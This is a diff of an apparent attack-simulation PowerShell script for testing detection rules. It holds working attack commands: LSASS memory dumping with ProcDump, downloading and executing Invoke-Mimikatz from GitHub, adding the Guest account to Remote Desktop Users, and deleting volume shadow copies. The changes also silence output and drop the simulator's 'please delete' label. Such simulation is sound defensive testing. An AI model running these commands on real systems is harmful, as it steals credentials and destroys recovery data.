@@ -171,9 +171,12 @@ Write-Host -ForegroundColor Cyan "`nStarting Credential Harvesting step"
 Write-Host "Downloading ProcDump.exe"
 Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$AttackDir\procdump.exe"
 Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
-Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula -at $n" 2>$null -Wait
+#Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula -at $n >nul 2>&1" 2>$null -Wait
+& $AttackDir\procdump.exe -ma lsass.exe lsass.dmp -accepteula -dc $n
 
 Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"
+Start-Sleep 2
+Remove-Item "$attackDir\lsass.dmp"
 
 # Mimikatz
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds; Start-Sleep -m $n"
@@ -201,12 +204,12 @@ Start-Sleep 10
 # LATERAL MOVEMENT
 Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
 Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
-net localgroup "Remote Desktop Users" Guest /add /COMMENT:"Datto Attack Simulator - please delete. $n"
+net localgroup "Remote Desktop Users" Guest /add /comment:"$n" >nul 2>&1
 Start-Sleep 3
 
 #Cleanup
 Write-Host "Removing Guest from Remote Desktop Users"
-net localgroup "Remote Desktop Users" Guest /delete
+net localgroup "Remote Desktop Users" Guest /delete  >nul 2>&1
 
 Start-Sleep 10
 
@@ -232,7 +235,7 @@ Start-Sleep 2
 Write-Host "Testing Rule: Shadow Copy Deletion"
 Write-Host "(Impact-T1490) Volume shadow copy was deleted"
 Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
-vssadmin.exe delete shadows /All /Shadow=$n /quiet
+vssadmin.exe delete shadows /All /Shadow=$n /quiet >nul 2>&1
 
 
 Write-Host "Testing Rule: Wallpaper Defacement"
